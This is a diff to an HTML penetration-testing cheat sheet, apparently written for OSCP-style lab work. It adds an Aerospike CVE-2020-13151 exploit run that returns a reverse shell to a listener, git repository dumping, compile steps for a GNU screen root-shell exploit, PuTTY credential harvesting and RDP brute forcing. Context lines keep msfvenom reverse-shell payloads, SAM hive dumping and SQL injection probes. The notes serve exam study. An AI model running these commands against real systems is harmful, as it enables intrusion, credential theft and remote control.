@@ -1958,6 +1958,31 @@ rsync -av rsync://$ip/httpd ./mytemp
 
 
 </code></pre>
+<h3 id="cgms-port-3003"><a class="header" href="#cgms-port-3003"><ins>cgms? port 3003</ins></a></h3>
+<p><a href="https://github.com/xsudoxx/OSCP#cgms-port-3003">Found here </a>
+<a href="https://github.com/b4ny4n/CVE-2020-13151">Also here</a></p>
+<h5 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h5>
+<pre><code>nc -nv $IP 3003 #run this
+</code></pre>
+<pre><code>help #run this
+</code></pre>
+<pre><code>bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
+</code></pre>
+<pre><code>version #run this
+</code></pre>
+<pre><code>Aerospike Community Edition build 5.1.0.1
+</code></pre>
+<h5 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h5>
+<pre><code>wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
+
+or might have to do this:
+
+git clone https://github.com/b4ny4n/CVE-2020-13151.git
+
+
+python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
+nc -nlvp 443
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-keys"><a class="header" href="#ssh-keys">SSH Keys</a></h1>
 <p>How to add your public SSH key to another host:</p>
 <p>Create SSH key (on your host):</p>
@@ -2832,7 +2857,7 @@ crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
 crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
 
 </code></pre>
-<h3 id="enumeration"><a class="header" href="#enumeration">Enumeration </a></h3>
+<h3 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration </a></h3>
 <h4 id="users"><a class="header" href="#users">Users</a></h4>
 <pre><code>
 # Enumerate users
@@ -5716,8 +5741,25 @@ https://github.com/liamim/shellshocker
 <ul>
 <li><a href="https://github.com/arthaud/git-dumper">Github Dump Tool</a></li>
 <li><a href="https://www.howtogeek.com/devops/how-to-view-commit-history-with-git-log/">Github Commit History</a></li>
+<li><a href="https://github.com/trufflesecurity/trufflehog">TruffleHog</a></li>
+<li><a href="https://www.gitkraken.com/download">GitKraken</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Source%20Code%20Management/#gogitdumper">Insecure Source Code Management Payload All The Things</a></li>
 </ul>
 <p>GIT Commit Dump - whenever you see some github files on the Victim machine, Exfiltrate it and refer to the following resources</p>
+<h3 id="git-dump"><a class="header" href="#git-dump">Git Dump</a></h3>
+<pre><code>For example:
+git-dumper http://192.168.232.144/.git/ TheGit
+
+
+Then run gitkraken gui on it to see file change history
+
+or maybe run TruffleHog on it:
+
+trufflehog git https://github.com/trufflesecurity/test_keys --only-verified
+
+
+
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="sql"><a class="header" href="#sql">SQL</a></h2>
 <h3 id="links-9"><a class="header" href="#links-9">Links</a></h3>
 <ul>
@@ -6226,7 +6268,7 @@ xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
 <pre><code>http://jarvis.htb/room.php?cod=6 and 1=1
 http://jarvis.htb/room.php?cod=6 and 1=2
 </code></pre>
-<h2 id="enumeration-1"><a class="header" href="#enumeration-1">enumeration</a></h2>
+<h2 id="enumeration-2"><a class="header" href="#enumeration-2">enumeration</a></h2>
 <pre><code>jarvis.htb/room.php?cod=6 order by 1
 jarvis.htb/room.php?cod=6 order by 7
 jarvis.htb/room.php?cod=6 order by 8 &gt; error
@@ -8204,6 +8246,25 @@ public class Main { public static void main(String[] args) {
 code here...
 } }
 </code></pre>
+<h3 id="gcc-note"><a class="header" href="#gcc-note">GCC Note</a></h3>
+<pre><code>https://www.exploit-db.com/exploits/41154
+
+I found a box that had a unusual gtfobin for screen. Found an exploit that required C compiler. Native kali once was wrong version, caused a `GLIBC_2.34' not found error.
+
+Apparently you can do this to find a gcc compiler on the victim machine:
+
+find / -name gcc* 2&gt;/dev/null
+
+But I used: https://github.com/X0RW3LL/XenSpawn
+
+Then did this:
+
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+gcc -o /tmp/rootshell /tmp/rootshell.c
+
+Then transferred both over to finish the exploit.
+
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><p><strong>g0tmilk's Guide to Linux Privilege Escalation as well:</strong><br />
 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br />
 </a><br />
@@ -8949,7 +9010,7 @@ C:\Program Files\yolo Apps\Current Version\yolo.exe
 icacls C:\Program Files\yolo Apps # Gives W on Users
 Put malicious Current.exe in the yolo folder
 </code></pre>
-<h4 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h4>
+<h4 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h4>
 <pre><code>1) msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;&gt; -f exe -o Common.exe
 OR
 2) addduser.c from shells module
@@ -8980,7 +9041,7 @@ OR
 Get-ScheduledTask | ft TaskName,TaskPath,State
 Get-ScheduledTask | where {$_.TaskPath -notlike  "\Microsoft*"} | ft TaskName,TaskPath,State
 </code></pre>
-<h4 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h4>
+<h4 id="exploitation-2"><a class="header" href="#exploitation-2">Exploitation</a></h4>
 <pre><code>1) icacls &lt;file.exe&gt; # Do we have M or F on BUILTIN/USERS or Username?
 2) Replace the file directly with adduser.exe or msfvenom shell
 msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;&gt; -f exe -o Common.exe
@@ -9171,7 +9232,7 @@ whoami /groups
 
 where fodhelper.exe # Find the location of fodhelper.exe on the system
 </code></pre>
-<h4 id="exploitation-2"><a class="header" href="#exploitation-2">Exploitation</a></h4>
+<h4 id="exploitation-3"><a class="header" href="#exploitation-3">Exploitation</a></h4>
 <pre><code># This can directly give high-level integrity sometimes, one-time wonder. if works, works.
 powershell.exe Start-Process cmd.exe -Verb runAs
 
@@ -9354,6 +9415,30 @@ reg save hklm\security c:\Users\Public\ksecurity
 # on kali
 samdump2 ksystem ksam
 impacket-secrectsdump -sam ksam -security ksecurity -system ksystem LOCAL
+</code></pre>
+<h3 id="putty"><a class="header" href="#putty">Putty</a></h3>
+<p>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials
+https://github.com/Arvanaghi/SessionGopher</p>
+<pre><code>If installed, might find creds
+
+1) reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
+
+or try this:
+
+2) . .\SessionGopher.ps1
+	1) Invoke-SessionGopher -Thorough
+
+
+
+</code></pre>
+<h3 id="rdp-bruteforce"><a class="header" href="#rdp-bruteforce">RDP Bruteforce</a></h3>
+<p>https://github.com/galkan/crowbar</p>
+<pre><code>You can use hydra, but this will probably work as well:
+
+# ./crowbar.py -b rdp -s 192.168.2.250/32 -u localuser -C ~/Desktop/passlist
+
+
+
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><p><strong>TL;DR</strong><br />
 + <strong>WHOAMI</strong>?<br />
